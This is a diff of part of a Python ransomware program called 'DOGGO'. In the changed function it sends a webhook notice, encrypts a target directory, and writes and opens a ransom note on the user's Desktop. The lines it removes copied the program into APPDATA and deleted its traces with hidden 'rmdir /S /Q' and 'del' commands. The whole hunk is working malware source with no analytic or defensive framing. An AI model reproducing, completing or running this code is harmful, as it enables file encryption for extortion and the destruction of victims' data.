@@ -161,47 +161,17 @@ def encrypted_files():
 
 def ransomware():
 
-    current_file = os.path.abspath(sys.argv[0])
-    appdata = os.path.join(os.getenv('APPDATA'), 'DOGGO')
+    send_wh()
+    encrypt_directory(target_directory)
+    encrypted_files()
 
-    if current_file.startswith(appdata):
-        send_wh()
-        encrypt_directory(target_directory)
-        encrypted_files()
+    try:
+        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+        file_path = os.path.join(desktop, 'DOGGO-RANSOMWARE-NOTE.txt')
+        with open(file_path, 'w') as f:
+            f.write(ransom_note)
 
-        try:
-            desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-            file_path = os.path.join(desktop, 'DOGGO-RANSOMWARE-NOTE.txt')
-            with open(file_path, 'w') as f:
-                f.write(ransom_note)
+        os.startfile(file_path)
 
-            os.startfile(file_path)
-
-            subprocess.Popen('ping localhost -n 3 > NUL && rmdir /S /Q "{}"'.format(appdata), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-
-            sys.exit()
-
-        except Exception as e:
-            log_error(e)
-
-    else:
-        try:
-            if not os.path.exists(appdata):
-                os.mkdir(appdata)
-
-            target_path = os.path.join(appdata, os.path.basename(current_file))
-            shutil.copy(current_file, target_path)
-
-            os.startfile(target_path)
-
-            path = sys.argv[0]
-
-            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-
-            sys.exit()
-
-        except Exception as e:
-            log_error(e)
-
-if __name__ == '__main__':
-    ransomware()
+    except Exception as e:
+        log_error(e)
